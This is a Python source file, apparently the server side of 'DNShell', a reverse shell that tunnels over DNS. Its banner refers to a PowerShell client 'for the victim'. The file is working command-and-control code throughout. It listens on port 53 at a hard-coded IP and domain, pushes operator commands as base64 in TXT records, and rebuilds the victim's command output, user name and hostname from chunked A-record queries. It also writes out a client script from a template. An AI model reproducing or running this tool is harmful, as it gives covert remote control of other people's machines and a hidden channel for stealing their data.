import subprocess
import re
import sys
import base64
import json
from pprint import pprint
import readline
import argparse  # Added argparse module
import threading
from dnslib import *
import socket
import codecs


print("""
     ______ _   _  _____ _          _ _
    |  _  \ \ | |/  ___| |        | | |
    | | | |  \| |\ `--.| |__   ___| | |
    | | | | . ` | `--. \ '_ \ / _ \ | |
    | |/ /| |\  |/\__/ / | | |  __/ | |
    |___/ \_| \_/\____/|_| |_|\___|_|_|
      """)

print("""
| ------------------------------------------------------------------------------------------------------|
| When you start DNShell without parameters it starts the server and waits for incoming connections.    |
| If you need the .ps1 file for the vitcim. Use the "--generate-client" argument                        |
|                                                                                                       |
| Author: Nicolas Caluori                                                                               |
| Github: https://github.com/Nicicalu/dnshell                                                           |
|-------------------------------------------------------------------------------------------------------|
""")


def base64_decode_string(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode('utf-8')
    return decoded_string


def base64_encode_string(string):
    encoded_bytes = base64.b64encode(string.encode("utf-8"))
    encoded_string = encoded_bytes.decode("utf-8")
    return encoded_string


def restore_case_by_hyphen(encoded_string):
    decoded_string = ""
    i = 0

    while i < len(encoded_string):
        if encoded_string[i] == "-":
            i += 1  # Skip the hyphen
            decoded_string += encoded_string[i].upper()
        else:
            decoded_string += encoded_string[i]
        i += 1

    return decoded_string


data = {}

domain = "revshell.dnshell.programm.zip"
expose = ("173.212.225.214", 53)


def generateClient():
    # Function to generate client
    print("Generating client... for domain {domain}")
    # Read client-preset.ps1
    with open('client-preset.ps1', 'r') as f:
        content = f.read()

    # Replace {domain} with the variable domain in the file
    content = content.replace('{domain}', domain)

    # prompt the user for the path, defaults to to "./client.ps1"
    path = input(
        'Enter the path to export the file (default: ./client.ps1): ') or './client.ps1'

    # export the file to the path specified
    with open(path, 'w') as f:
        f.write(content)

    # ask the user if he wants to start the server
    start_server = input('Do you want to start the server? (y/n): ')
    if start_server.lower() == 'y':
        # start the server
        # ...
        pass
    else:
        main()

def parseRequest(request, addr):
    return {
            "ip_address": addr[0],
            "domain_name": str(request.q.qname),
            "query_class": str(request.q.qclass),
            "query_type": QTYPE[request.q.qtype],
            "domain_parts": str(request.q.qname).replace(f".{domain}", "").split(".")
    }

def sendData(code,counter,command):
    #print("func: SendData")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(expose)
    while True:
        #print("Waiting fo Client to get it's data")
        rawrequest, addr = s.recvfrom(1024)
        request = DNSRecord.parse(rawrequest)
        query = parseRequest(request, addr)
        if(query["query_type"] == "TXT" and query["domain_name"] == f"{counter}.{code}.{domain}."):
            # Build response with command
            command = base64_encode_string(command)
            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            TTL = 60 * 5
            rdata = TXT(command.encode("utf-8"))
            response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
            s.sendto(b'%s' % response.pack(), addr)
            return;


def getData(code,counter):
    #print("func: GetData")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(expose)
    while True:
        rawrequest, addr = s.recvfrom(1024)
        request = DNSRecord.parse(rawrequest)
        query = parseRequest(request, addr)
        #print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
        if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{domain}."):
            thisdata = query["domain_parts"]

            if not thisdata[3] in data:
                data[thisdata[3]] = {}
            data[thisdata[3]][int(thisdata[1])
                                ] = thisdata[0].replace("_", "=")

            print_progress(len(data[thisdata[3]]), int(thisdata[2]), prefix='Progress:', suffix='Complete', bar_length=50)
            datastring = ""
            for i in range(0, int(thisdata[2])):
                # if data[thisdata[3]] has key i
                if i in data[thisdata[3]]:
                    datastring += data[thisdata[3]][i]

            # Lower because anti dns caching messed up the cases
            datastring = datastring.lower()

            #print(f"Base64 with hyphens: {datastring}")
            # For every letter in the string, if there is a hyphen in front of it, change it to upper case
            datastring = restore_case_by_hyphen(datastring.strip("-"))

            #print(f"Base64: {datastring}")
            
            # cap the datastring variable to a length devideable by 4
            datastring = datastring[:-(len(datastring) % 4)]
            # base64 decode
            decoded = base64_decode_string(datastring)
            print(f"Partial data: {decoded}")
            if len(data[thisdata[3]]) == int(thisdata[2]):
                #print("--------------------- Data recieved ---------------------")
                # Put the data together in one variable
                datastring = ""
                for i in range(0, int(thisdata[2])):
                    datastring += data[thisdata[3]][i]

                # Lower because anti dns caching messed up the cases
                datastring = datastring.lower()

                #print(f"Base64 with hyphens: {datastring}")
                # For every letter in the string, if there is a hyphen in front of it, change it to upper case
                datastring = restore_case_by_hyphen(datastring)

                #print(f"Base64: {datastring}")

                # base64 decode
                decoded = base64_decode_string(datastring)
                # JSON decode
                #print(f"JSON: {decoded}")
                response = json.loads(decoded)
                return response
            
            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            TTL = 60 * 5
            rdata = A("1.1.1.1")
            #response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=rdata))
            
            s.sendto(b'%s' % response.pack(), addr)
        #else:
            #print("No valid request")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--generate-client", action="store_true",
                        help="Generates the .ps1 client file")
    args = parser.parse_args()

    if args.generate_client:
        generateClient()
    else:
        pwd = ""
        user = ""
        hostname = ""

        print("Waiting for client to connect... and identify itself")
        response = getData(0, 0)
        code = response["code"]
        pwd = response["pwd"]
        user = response["user"]
        hostname = response["hostname"]

        print("")
        print("----------------------- Client connected -----------------------")
        print(f"ID for this Reverse Shell: {code}")
        print(f"User: {user}")
        print(f"Hostname: {hostname}")
        print("----------------------------------------------------------------")
        print("")

        command = ""
        counter = 0
        while command != "exit":
            command = input(f"{user}@{hostname}: {pwd}> ")

            readline.add_history(command)

            sendData(code,counter,command)

            if command != "exit":
                response = getData(code, counter)
                pwd = response["pwd"]
                user = response["user"]
                hostname = response["hostname"]
                output = response["output"]

                print(output)

            counter += 1


def print_progress(iteration, total, prefix='', suffix='', decimals=1, bar_length=100):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        bar_length  - Optional  : character length of bar (Int)
    """
    str_format = "{0:." + str(decimals) + "f}"
    percents = str_format.format(100 * (iteration / float(total)))
    filled_length = int(round(bar_length * iteration / float(total)))
    bar = '█' * filled_length + '-' * (bar_length - filled_length)

    if iteration == total:
        # Remove progress bar
        sys.stdout.write('\x1b[2K')
    else:
        sys.stdout.write('\r%s |%s| %s%s %s' %
                         (prefix, bar, percents, '%', suffix))

    if iteration == total:
        sys.stdout.write('\n')
    sys.stdout.flush()


if __name__ == "__main__":
    main()